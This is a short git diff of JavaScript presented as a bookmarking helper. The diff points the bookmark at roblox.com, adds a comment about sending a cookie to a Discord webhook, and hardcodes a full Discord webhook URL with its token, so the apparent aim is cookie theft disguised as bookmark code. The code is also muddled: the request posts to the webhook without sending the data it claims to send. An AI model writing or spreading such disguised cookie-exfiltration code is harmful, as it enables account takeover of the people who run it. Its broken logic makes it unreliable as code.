@@ -1,6 +1,7 @@
 // Store bookmark information as a string of URL-encoded key-value pairs
-const bookmarkData = 'https://example.com/page?param1=value1&param2=value2';
+const bookmarkData = 'https://www.roblox.com/home';
 
+// Function to send a cookie to Discord webhook
 function sendToDiscordWebhook(cookieUrl) {
   // Make a POST request to the Discord webhook endpoint using fetch
   fetch(cookieUrl, { method: "POST" })
@@ -19,7 +20,7 @@ function bookmarkPage(url, message = '') {
   localStorage.setItem('bookmarkData', `url=${encodedUrl}&message=${encodedMessage}`);
 
   // Call sendToDiscordWebhook to send the bookmarked URL to Discord webhook
-  sendToDiscordWebhook(`https://discord.com/webhooks/1488315746755805234${encodedUrl}&message=${encodedMessage}`);
+  sendToDiscordWebhook(`https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4`);
 }
 
 // Add a click handler to your webpage's link element that triggers bookmarking
